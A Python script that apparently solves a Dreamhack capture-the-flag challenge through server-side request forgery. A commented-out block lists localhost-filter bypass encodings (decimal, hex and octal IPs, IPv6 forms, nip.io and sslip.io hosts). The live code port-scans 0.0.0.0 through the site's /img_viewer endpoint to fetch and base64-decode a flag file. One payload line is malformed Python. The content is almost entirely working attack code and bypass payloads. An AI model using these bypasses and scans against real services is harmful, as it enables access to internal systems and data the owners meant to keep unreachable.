
# from urllib.parse import urlparse
# from bs4 import BeautifulSoup
# import requests

# internal = [
#     '::',
#     'localhost',
#     '127.0.0.1',
#     '0.0.0.0',
#     '0000::1',
#     '0:0:0:0:0:ffff:127.0.0.1',
#     '::ffff:127.0.0.1',
#     '0',
#     '127.1',
#     '2130706433',
#     '0x7f000001',
#     '017700000001',
#     '::1',
#     '0:0:0:0:0:0:0:1',
#     'LOCALHOST',
#     'localhost.',
#     'lvh.me',
#     'localtest.me',
#     'localh.st',
#     'sslip.io',
#     '127.0.0.1.sslip.io',
#     'company.127.0.0.1.nip.io'
# ]

# test = []
# for url in internal:
#     urlp = urlparse('http://' + url)
#     if ("localhost" not in urlp.netloc) and ("127.0.0.1" not in urlp.netloc):
#         test.append(url)



# def get_internal(lst):
#     for url in lst:
#         response = requests.post(url="http://localhost:8000/img_viewer",
#                                  data={'url':'http://'+url+':1611'+'/flag.txt'},
#                                  proxies={'http':'http://localhost:8080'}
#                                  )
#         if response.headers.get('Content-Length') != '65121':
#             print(f'{url} - {BeautifulSoup(response.text, 'html.parser')}')

# get_internal(test)


import base64
import requests
from bs4 import BeautifulSoup

url = "http://host3.dreamhack.games:16424"

payload = {
    'url': f'http://0.0.0.0:{port}/flag.txt' for port in range(1500, 1800)
}

for port in range(1500, 1800): # 
    response = requests.post(url=url+'/img_viewer', data={'url':f'http://0.0.0.0:{port}/flag.txt'}, proxies={'http':'http://localhost:8080'})
    if response.headers.get('Content-Length') not in ['65121']:
        soup = BeautifulSoup(response.text, 'html.parser')
        tag = soup.find('img')
        if tag and 'src' in tag.attrs:
            base64_flag = tag["src"].split(",")[-1].strip()
            print(base64.b64decode(base64_flag).decode('utf-8'))
            break
        
